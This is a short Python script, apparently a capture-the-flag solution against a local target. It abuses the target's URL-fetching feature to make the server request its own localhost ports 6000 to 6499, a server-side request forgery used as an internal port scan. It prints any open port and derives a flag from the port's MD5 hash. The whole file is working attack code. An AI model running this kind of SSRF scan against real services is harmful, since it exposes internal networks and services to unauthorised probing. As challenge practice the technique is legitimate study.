import requests
import re
import hashlib

TARGET = "http://localhost:7778"

for i in range(6000, 6500):
    result = requests.post(TARGET, data={"url": "http://localhost:" + str(i)}).text
    url = re.findall(r'src="([^">]+)" sandbox', result)[0]
    response = requests.post(TARGET + "/" + url).text
    if "Connection refused" not in response:
        print(str(i) + ": " + response)
        print("FLAG-" + hashlib.md5(str(i).encode()).hexdigest())